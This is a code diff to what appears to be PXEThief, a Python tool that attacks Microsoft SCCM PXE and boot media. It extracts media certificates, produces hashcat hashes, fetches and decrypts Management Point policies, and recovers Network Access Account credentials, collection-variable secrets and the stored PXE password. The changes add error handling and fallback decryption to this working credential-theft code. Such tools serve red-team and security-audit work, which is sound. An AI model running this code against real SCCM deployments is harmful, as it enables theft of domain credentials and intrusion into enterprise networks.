@@ -458,9 +458,29 @@ def auto_exploit_media_variables(var_file_name, media_variables):
     write_to_file("variables", media_variables)
 
     root = ET.fromstring(media_variables.encode("utf-16-le"))
-    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
-    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
-    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
+
+    site_code_el = root.find('.//var[@name="_SMSTSSiteCode"]')
+    guid_el = root.find('.//var[@name="_SMSMediaGuid"]')
+    pfx_el = root.find('.//var[@name="_SMSTSMediaPFX"]')
+
+    if site_code_el is None or not site_code_el.text:
+        error("_SMSTSSiteCode not found in media variables")
+        return
+    if guid_el is None or not guid_el.text:
+        error("_SMSMediaGuid not found in media variables")
+        return
+    if pfx_el is None or not pfx_el.text:
+        error("_SMSTSMediaPFX not found in media variables — no certificate to extract")
+        return
+
+    smsMediaSiteCode = site_code_el.text
+    smsMediaGuid = guid_el.text[:31]
+    try:
+        smsTSMediaPFX = binascii.unhexlify(pfx_el.text)
+    except (ValueError, binascii.Error) as e:
+        error(f"Failed to decode PFX hex data: {e}")
+        return
+
     filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"
 
     warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
@@ -506,8 +526,8 @@ def get_pxe_files(ip):
     try:
         hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
         found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
-    except Exception:
-        pass
+    except Exception as e:
+        warning(f"Could not compute hashcat hash: {e}")
 
     if BLANK_PASSWORDS_FOUND:
         warning("Blank password — exploiting via DHCP encrypted key...")
@@ -543,11 +563,20 @@ def generateClientTokenSignature(data, private_key):
     return binascii.hexlify(reversed_sig).decode()
 
 def deobfuscate_credential_string(credential_string):
+    if len(credential_string) < 130:
+        raise ValueError(f"Credential string too short ({len(credential_string)} chars, need >= 130)")
     key_data = binascii.unhexlify(credential_string[8:88])
     encrypted_data = binascii.unhexlify(credential_string[128:])
+    if len(encrypted_data) == 0:
+        raise ValueError("Encrypted data portion is empty")
     key = media_crypto.aes_des_key_derivation(key_data)
     last_16 = math.floor(len(encrypted_data)/8)*8
-    return media_crypto._3des_decrypt(encrypted_data[:last_16], key[:24])
+    try:
+        result = media_crypto._3des_decrypt(encrypted_data[:last_16], key[:24])
+    except UnicodeDecodeError:
+        raw = media_crypto._3des_decrypt_raw(encrypted_data[:last_16], key[:24])
+        result = safe_decode_utf16le(raw, "deobfuscated credential")
+    return result
 
 def decrypt_media_file(path, password, silent=False):
     password_is_string = isinstance(password, str)
@@ -584,8 +613,18 @@ def decrypt_media_file(path, password, silent=False):
 
 def process_pxe_bootable_and_prestaged_media(media_xml):
     root = ET.fromstring(media_xml.encode("utf-16-le"))
-    smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text
-    smsTSMediaPFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text
+
+    guid_el = root.find('.//var[@name="_SMSMediaGuid"]')
+    pfx_el = root.find('.//var[@name="_SMSTSMediaPFX"]')
+    if guid_el is None or not guid_el.text:
+        error("_SMSMediaGuid not found in media variables — cannot retrieve policies")
+        return
+    if pfx_el is None or not pfx_el.text:
+        error("_SMSTSMediaPFX not found in media variables — cannot retrieve policies")
+        return
+
+    smsMediaGuid = guid_el.text
+    smsTSMediaPFX = pfx_el.text
 
     global SCCM_BASE_URL
     if SCCM_BASE_URL == "":
@@ -596,6 +635,10 @@ def process_pxe_bootable_and_prestaged_media(media_xml):
             SCCM_BASE_URL = SMSTSMP.text
         elif SMSTSLocationMPs is not None:
             SCCM_BASE_URL = SMSTSLocationMPs.text
+        if not SCCM_BASE_URL:
+            error("Could not identify Management Point URL from media variables (SMSTSMP / SMSTSLocationMPs)")
+            info("Set [bold]SCCM_BASE_URL[/] manually in settings.ini or pxethief.py")
+            return
         success(f"Management Point URL: [bold]{SCCM_BASE_URL}[/]")
     else:
         info(f"Using manually set Management Point URL: [bold]{SCCM_BASE_URL}[/]")
@@ -609,7 +652,10 @@ def process_full_media(password, policy):
         info(f"Password for policy decryption: [bold]{password}[/]")
         key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
         last_16 = math.floor(len(encrypted_policy)/16)*16
-        decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16], key[:16])
+        try:
+            decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16], key[:16])
+        except UnicodeDecodeError:
+            decrypted_ts = media_crypto.aes256_decrypt(encrypted_policy[:last_16], key[:32])
         decrypted_ts = decrypted_ts[:decrypted_ts.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_ts if c.isprintable())
         success(f"Successfully decrypted policy [bold]{policy}[/]!")
@@ -643,10 +689,22 @@ def use_encrypted_key(encrypted_key, media_file_path):
 def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
     smsMediaGuid = guid
     CCMClientID = smsMediaGuid
-    smsTSMediaPFX = binascii.unhexlify(cert_bytes)
+    try:
+        smsTSMediaPFX = binascii.unhexlify(cert_bytes)
+    except (ValueError, binascii.Error) as e:
+        error(f"Failed to decode certificate hex data: {e}")
+        return
 
-    pk, cert_obj, chain = pkcs12.load_key_and_certificates(smsTSMediaPFX, smsMediaGuid[:31].encode())
+    try:
+        pk, cert_obj, chain = pkcs12.load_key_and_certificates(smsTSMediaPFX, smsMediaGuid[:31].encode())
+    except Exception as e:
+        error(f"Failed to load PFX certificate: {e}")
+        info("The PFX data may be corrupted or the GUID password may be wrong")
+        return
     private_key = pk
+    if not private_key:
+        error("PFX loaded but contains no private key — cannot sign requests")
+        return
     success("Successfully loaded PFX file!")
 
     if cert_obj:
@@ -689,56 +747,79 @@ def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
     for colsetting in colsettings:
         console.rule("[bold magenta]Collection Variables — All Unknown Computers[/]", style="magenta")
 
-        is_plaintext = False
         try:
-            colsetting.content.decode("utf-16-le")
-            is_plaintext = True
-        except (UnicodeDecodeError, AttributeError):
-            pass
+            is_plaintext = False
+            try:
+                colsetting.content.decode("utf-16-le")
+                is_plaintext = True
+            except (UnicodeDecodeError, AttributeError):
+                pass
 
-        if USING_TLS or is_plaintext:
-            wf_dstr = safe_decode_utf16le(colsetting.content, "collection settings")
-        else:
-            dstr = cms_decrypt(private_key, colsetting.content)
-            dstr = safe_decode_utf16le(dstr, "decrypted collection settings")
+            if USING_TLS or is_plaintext:
+                wf_dstr = safe_decode_utf16le(colsetting.content, "collection settings")
+            else:
+                dstr = cms_decrypt(private_key, colsetting.content)
+                dstr = safe_decode_utf16le(dstr, "decrypted collection settings")
+                wf_dstr = "".join(c for c in dstr if c.isprintable())
+
+            root = ET.fromstring(wf_dstr)
+            dstr = safe_decode_utf16le(zlib.decompress(binascii.unhexlify(root.text)), "decompressed collection settings")
             wf_dstr = "".join(c for c in dstr if c.isprintable())
+            write_to_file("CollectionSettings", wf_dstr)
+            root = ET.fromstring(wf_dstr)
 
-        root = ET.fromstring(wf_dstr)
-        dstr = safe_decode_utf16le(zlib.decompress(binascii.unhexlify(root.text)), "decompressed collection settings")
-        wf_dstr = "".join(c for c in dstr if c.isprintable())
-        write_to_file("CollectionSettings", wf_dstr)
-        root = ET.fromstring(wf_dstr)
-
-        instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
+            instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
+        except Exception as e:
+            error(f"Failed to decrypt/parse collection settings policy: {e}")
+            continue
 
         for instance in instances:
-            encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text
-            collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text
+            try:
+                encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text
+                collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text
+            except (IndexError, AttributeError) as e:
+                warning(f"Could not parse collection variable XML element: {e}")
+                continue
 
             cred("Collection Variable", collection_var_name)
-            collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
-            collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
-            cred("Secret", collection_var_secret)
+            if not encrypted_collection_var_secret:
+                warning("Collection variable value is null")
+                continue
+            try:
+                collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
+                collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
+                cred("Secret", collection_var_secret)
+            except Exception as e:
+                error(f"Failed to deobfuscate collection variable [bold]{collection_var_name}[/]: {e}")
+                info(f"Raw value (first 64 chars): [dim]{encrypted_collection_var_secret[:64]}...[/]")
 
     console.rule("[bold green]Network Access Account Configuration[/]", style="green")
     for naaConfig in naaConfigs:
-        if USING_TLS:
-            dstr = safe_decode_utf16le(naaConfig.content, "NAA config")
-        else:
-            dstr = cms_decrypt(private_key, naaConfig.content)
-            dstr = safe_decode_utf16le(dstr, "decrypted NAA config")
-        wf_dstr = "".join(c for c in dstr if c.isprintable())
-        process_naa_xml(wf_dstr)
+        try:
+            if USING_TLS:
+                dstr = safe_decode_utf16le(naaConfig.content, "NAA config")
+            else:
+                dstr = cms_decrypt(private_key, naaConfig.content)
+                dstr = safe_decode_utf16le(dstr, "decrypted NAA config")
+            wf_dstr = "".join(c for c in dstr if c.isprintable())
+            process_naa_xml(wf_dstr)
+        except Exception as e:
+            error(f"Failed to decrypt/parse NAA config policy: {e}")
+            continue
 
     console.rule("[bold green]Task Sequence Configuration[/]", style="green")
     for tsConfig in tsConfigs:
-        if USING_TLS:
-            dstr = safe_decode_utf16le(tsConfig.content, "task sequence config")
-        else:
-            dstr = cms_decrypt(private_key, tsConfig.content)
-            dstr = safe_decode_utf16le(dstr, "decrypted task sequence config")
-        wf_dstr = "".join(c for c in dstr if c.isprintable())
-        tsSequence = process_task_sequence_xml(wf_dstr)
+        try:
+            if USING_TLS:
+                dstr = safe_decode_utf16le(tsConfig.content, "task sequence config")
+            else:
+                dstr = cms_decrypt(private_key, tsConfig.content)
+                dstr = safe_decode_utf16le(dstr, "decrypted task sequence config")
+            wf_dstr = "".join(c for c in dstr if c.isprintable())
+            process_task_sequence_xml(wf_dstr)
+        except Exception as e:
+            error(f"Failed to decrypt/parse task sequence policy: {e}")
+            continue
 
 def process_naa_xml(naa_xml):
     root = ET.fromstring(naa_xml)
@@ -790,9 +871,18 @@ def process_naa_xml(naa_xml):
 def process_task_sequence_xml(ts_xml):
     root = ET.fromstring(ts_xml)
 
-    pkg_name = root.xpath("//*[@name='PKG_Name']/value")[0].text
-    adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[0].text
-    ts_sequence_tag = root.xpath("//*[@name='TS_Sequence']/value")[0].text
+    pkg_name_el = root.xpath("//*[@name='PKG_Name']/value")
+    adv_id_el = root.xpath("//*[@name='ADV_AdvertisementID']/value")
+    ts_sequence_el = root.xpath("//*[@name='TS_Sequence']/value")
+
+    pkg_name = pkg_name_el[0].text if pkg_name_el and pkg_name_el[0].text else "UnknownPackage"
+    adv_id = adv_id_el[0].text if adv_id_el and adv_id_el[0].text else "UnknownAdv"
+
+    if not ts_sequence_el or not ts_sequence_el[0].text:
+        error(f"TS_Sequence element not found in task sequence policy [bold]{pkg_name}[/]")
+        return
+
+    ts_sequence_tag = ts_sequence_el[0].text
 
     tsName = pkg_name + "-" + adv_id
     keepcharacters = (' ','.','_', '-')
@@ -806,6 +896,7 @@ def process_task_sequence_xml(ts_xml):
             success(f"Decrypted TS_Sequence in [bold]{pkg_name}[/]")
         except Exception as e:
             error(f"Failed to decrypt TS_Sequence in [bold]{pkg_name}[/]: {e}")
+            info(f"Raw TS_Sequence (first 64 chars): [dim]{ts_sequence_tag[:64]}...[/]")
             return
 
     tsSequence = tsSequence[:tsSequence.rfind(">")+1]
@@ -899,7 +990,7 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClien
 
     multipart_data = MultipartDecoder.from_response(r)
 
-    policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
+    policy_xml = safe_decode_utf16le(zlib.decompress(multipart_data.parts[1].content), "policy assignments XML")
     wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())
 
     if DUMP_REPLYASSIGNMENTS_XML:
@@ -1091,8 +1182,12 @@ if __name__ == "__main__":
     elif int(sys.argv[1]) == 7:
         console.print(BANNER)
         info("Decrypting stored PXE password from SCCM DP registry key Reserved1")
-        reserved = deobfuscate_credential_string(sys.argv[2])
-        cred("PXE Password", reserved[:reserved.rfind('\x00')])
+        try:
+            reserved = deobfuscate_credential_string(sys.argv[2])
+            cred("PXE Password", reserved[:reserved.rfind('\x00')])
+        except Exception as e:
+            error(f"Failed to decrypt PXE password: {e}")
+            info(f"Input value (first 64 chars): [dim]{sys.argv[2][:64]}...[/]")
 
     elif int(sys.argv[1]) == 8:
         console.print(BANNER)
